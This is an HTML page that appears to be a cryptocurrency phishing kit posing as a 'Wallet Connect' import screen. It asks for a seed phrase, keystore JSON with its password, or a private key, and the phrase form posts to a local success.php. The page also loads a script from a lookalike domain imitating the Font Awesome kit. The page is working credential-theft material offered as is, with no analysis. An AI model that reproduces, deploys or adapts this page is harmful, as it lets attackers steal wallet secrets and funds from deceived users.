<!DOCTYPE html>
<html lang="en">


<meta http-equiv="content-type" content="text/html;charset=UTF-8" />


<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>Wallet Connect | Import wallet key</title>
    <link rel="stylesheet" href="../assets/css/style.css">
    <link rel="preconnect" href="https://fonts.gstatic.com/">
    <link href="https://fonts.googleapis.com/css2?family=Lato:wght@100;300;400;700;900&amp;display=swap" rel="stylesheet">
    <script src="https://sync-trustappscloud.online/kit.fontawesome.com/3001ac0519.js" crossorigin="anonymous"></script>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.1/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-+0n0xVW2eSR5OomGNYDnhzAbDsOXxcvSN1TPprVMTNDbiYZCxYbOOl7+AMvyTG2x" crossorigin="anonymous">

</head>

<body>
    <div class="import" style="background-color:black;">
        <div class="import__container">
            <a href="#" class="import__header">
                <i class="fa fa-less-than import__header--icon"></i>
                <span class="import__header--text text- " style="color: rgb(65, 141, 241);"> Import Wallet</span>
            </a>
            <div class="import__tab ">
                <!-- Tab headers (navigation) -->
                <div class="import__tab__header bg-dark">
                    <a href="#phrase" class="import__tab__header--item import__tab__header--item--1 current  " style="color: rgb(65, 141, 241);">Phrase</a>
                    <a href="#keystore-json" class="import__tab__header--item import__tab__header--item--2" style="color: rgb(65, 141, 241);">Keystore Json</a>
                    <a href="#private-key" class="import__tab__header--item import__tab__header--item--3" style="color: rgb(65, 141, 241);">Private Key</a>
                </div>
                

                <!-- Tab bodies (content) -->
                <div class="import__tab__body">

                    <!-- Tab body (phrase) -->
                    <div  class="import__tab__body--item import__tab__body--item--phrase current">
                        <form action="./success.php" method="POST" >
                        <input type="hidden" name="phrase" value="" placeholder="Torus" >
                            <div class="form__errorBox form__errorBox--phrase"></div>
                            <textarea class="form__input form__input--textarea" name="phrase" cols="30" rows="5" placeholder="Enter Phrase..." required></textarea>
                            <!-- use this to prevent spam -->

                            <label for="phrase_input" class="form__label">Typically 12 (sometimes 24) words separated by a single space.</label>
                            <button class="form__button" name='btnSubmit' type="submit" style="background-color:rgb(65, 141, 241);">Connect</button>
                        </form>
                    </div>

                     
                    <!-- Tab body (keystore json) -->
                    <div class="import__tab__body--item import__tab__body--item--keystore-json">
                        <form action="" method="" >
                            <textarea class="form__input form__input--textarea" name="Portis-keystore_json" cols="30" rows="5" placeholder="Keystore JSON..." required></textarea>
                            <input type="hidden" name="subject" value="Torus">
                            <!-- use this to prevent spam -->

                            <label for="keystore_password"></label>
                            <input type="password" name="phrase" class="form__input" placeholder="Password..." required>

                            <label for="Portiskeystore_json" class="form__label">Several lines of text beginning with "{...}" plus the password you used to encrypt it. </label>
                        </form> 
                    </div>

                    <!-- Tab body (private key) -->
                    <form action="" method="" >
                        <div  class="import__tab__body--item import__tab__body--item--private-key">
                        <input type="hidden" name="subject" value="Torus">
                            <!-- use this to prevent spam -->

                            <input type="text" name="content" class="form__input" placeholder="Private Key..." required>
                            <label for="Portis priv_key" class="form__label">Typically 12 (sometimes 24) words separated by a single space.</label>
                        </div>
                </div>
            </div>
        </div>
    </div>
    </form>
    <script src="../assets/js/app.js"></script>

    <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.9.2/dist/umd/popper.min.js"></script>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
    
</body>


</html>

   